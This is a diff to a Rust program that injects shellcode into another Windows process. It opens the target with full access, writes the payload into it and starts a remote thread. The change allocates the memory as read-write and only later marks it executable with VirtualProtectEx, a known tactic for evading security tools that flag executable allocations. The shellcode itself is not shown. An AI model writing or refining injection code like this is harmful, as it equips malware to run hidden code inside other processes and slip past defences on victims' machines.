@@ -1,7 +1,8 @@
+#![allow(unused_imports)]
 use windows::{
     Win32::{
         System::{
-            Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
+            Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
             Diagnostics::Debug::WriteProcessMemory, 
             Threading::{CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS, INFINITE},
         },
@@ -41,7 +42,7 @@ fn main() {
                     Some(null_mut()),
                     shellcode.len(),
                     MEM_COMMIT | MEM_RESERVE,
-                    PAGE_EXECUTE_READWRITE,
+                    PAGE_READWRITE,
                 );
 
                 if haddr.is_null() {
@@ -56,12 +57,24 @@ fn main() {
                     haddr, 
                     shellcode.as_ptr() as _,
                     shellcode.len(),
-                    None).unwrap_or_else(|e| {
+                    None,).unwrap_or_else(|e| {
                         eprintln!("[!] WriteProcessMemory Failed With Error: {}", e);
                         let _ = CloseHandle(hprocess);
                         process::exit(-1);
                     }
                 );
+
+                let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
+                VirtualProtectEx(
+                    hprocess,
+                    haddr,
+                    shellcode.len(),
+                    PAGE_EXECUTE_READWRITE,
+                    &mut oldprotect,).unwrap_or_else(|e| {
+                    eprintln!("[!] VirtualProtectEx Failed With Error: {}", e);
+                    let _ = CloseHandle(hprocess);
+                    process::exit(-1);
+                });
                 
                 println!("[+] Creating a Remote Thread");
                 let hthread = CreateRemoteThreadEx(
